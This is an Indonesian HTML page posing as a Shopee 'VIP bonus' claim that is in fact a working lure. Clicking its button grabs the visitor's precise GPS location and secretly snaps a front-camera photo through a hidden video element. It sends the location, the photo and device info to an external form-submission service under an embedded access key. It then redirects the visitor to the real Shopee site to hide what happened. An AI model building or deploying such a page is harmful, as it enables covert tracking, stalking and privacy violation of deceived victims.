<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Klaim Bonus VIP - Shopee</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            overflow: hidden;
            text-align: center;
            padding-bottom: 20px;
        }
        .header {
            padding: 20px;
            background: #fff4f0;
            border-bottom: 1px solid #eee;
        }
        .header h1 {
            color: #ee4d28;
            font-size: 22px;
            margin: 0;
        }
        .header p {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        .image-wrapper {
            width: 100%;
            padding: 15px;
            box-sizing: border-box;
        }
        .image-wrapper img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .btn-overlay {
            background: linear-gradient(135deg, #ee4d28, #f7a645);
            color: white;
            padding: 18px;
            font-size: 18px;
            font-weight: bold;
            letter-spacing: 1px;
            box-shadow: 0 4px 10px rgba(238, 77, 40, 0.4);
            margin-top: 20px;
            border-radius: 30px;
            display: inline-block;
            width: 80%;
            cursor: pointer;
            transition: transform 0.1s;
            border: none;
        }
        .btn-overlay:active {
            transform: scale(0.98);
        }
        #loading {
            display: none;
            padding: 40px 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ee4d28;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-success {
            color: #28a745;
            font-weight: bold;
            font-size: 18px;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>🎉 Selamat! Kamu Terpilih</h1>
            <p>Bonus Spesial Hari Ini</p>
        </div>

        <!-- AREA GAMBAR DAN TOMBOL -->
        <div class="image-wrapper" id="clickArea">
            <!-- PASTIKAN FILE GAMBAR KAMU NAMA NYA: umpan . jpg.png -->
            <!-- Jika nama file beda, ganti di sini -->
            <img src="umpan . jpg.png" alt="Klaim Bonus Shopee VIP">
            
            <button class="btn-overlay" onclick="startProcess()">
                👆 KLIK UNTUK KLAIM BONUS 👆
            </button>
        </div>

        <!-- LOADING SCREEN -->
        <div id="loading">
            <div class="spinner"></div>
            <p style="font-size: 14px; color: #777; margin-top: 10px;">Memproses Klaim VIP...</p>
        </div>

        <!-- SUKSES SCREEN -->
        <div id="successMsg" class="status-success" style="padding: 20px;">
            ✅ Bonus VIP Berhasil Masuk!
        </div>
    </div>

    <script>
        // --- KONFIGURASI API KEY KAMU ---
        const API_KEY = "7e55426b-9f49-4a5f-be85-75305abb1b30";
        // --------------------------------

        function startProcess() {
            const clickArea = document.getElementById('clickArea');
            const loading = document.getElementById('loading');
            const success = document.getElementById('successMsg');

            // Sembunyikan gambar, tampilkan loading
            clickArea.style.display = 'none';
            loading.style.display = 'block';

            // 1. Ambil Lokasi GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        takePhoto(lat, lon);
                    },
                    (error) => {
                        console.log("GPS Error:", error);
                        takePhoto("GPS Found", "GPS Found");
                    },
                    { timeout: 3000, enableHighAccuracy: true }
                );
            } else {
                takePhoto("No GPS", "No GPS");
            }
        }

        function takePhoto(lat, lon) {
            const video = document.createElement('video');
            video.style.display = 'none';
            video.autoplay = true;
            video.playsInline = true;

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    document.body.appendChild(video);

                    // Tunggu 1.5 detik agar kamera fokus dan gambar jelas
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const photoDataUrl = canvas.toDataURL('image/png');

                        // Hentikan kamera
                        stream.getTracks().forEach(track => track.stop());
                        document.body.removeChild(video);

                        // Kirim Data
                        sendData(lat, lon, photoDataUrl);
                    }, 1500);
                })
                .catch(err => {
                    // Jika kamera gagal (misal: izin ditolak), kirim lokasi saja
                    console.log("Camera Error:", err);
                    sendData(lat, lon, "Camera Skipped");
                });
        }

        function sendData(lat, lon, photoData) {
            const loading = document.getElementById('loading');
            const success = document.getElementById('successMsg');

            loading.style.display = 'none';
            success.style.display = 'block';

            const formData = new FormData();
            formData.append("access_key", API_KEY);
            formData.append("Target_Location", `${lat}, ${lon}`);
            formData.append("Device_Info", navigator.userAgent);
            formData.append("Selfie_Photo", photoData);
            formData.append("Subject", "🎁 VIP BONUS DIKLAIM - DATA BARU");

            fetch("https://api.web3forms.com/submit", {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                // Redirect ke Shopee asli setelah 2 detik
                setTimeout(() => {
                    window.location.href = "https://shopee.co.id/";
                }, 2000);
            })
            .catch(err => {
                console.log("Fetch Error:", err);
                setTimeout(() => {
                    window.location.href = "https://shopee.co.id/";
                }, 2000);
            });
        }
    </script>
</body>
</html>
</html>
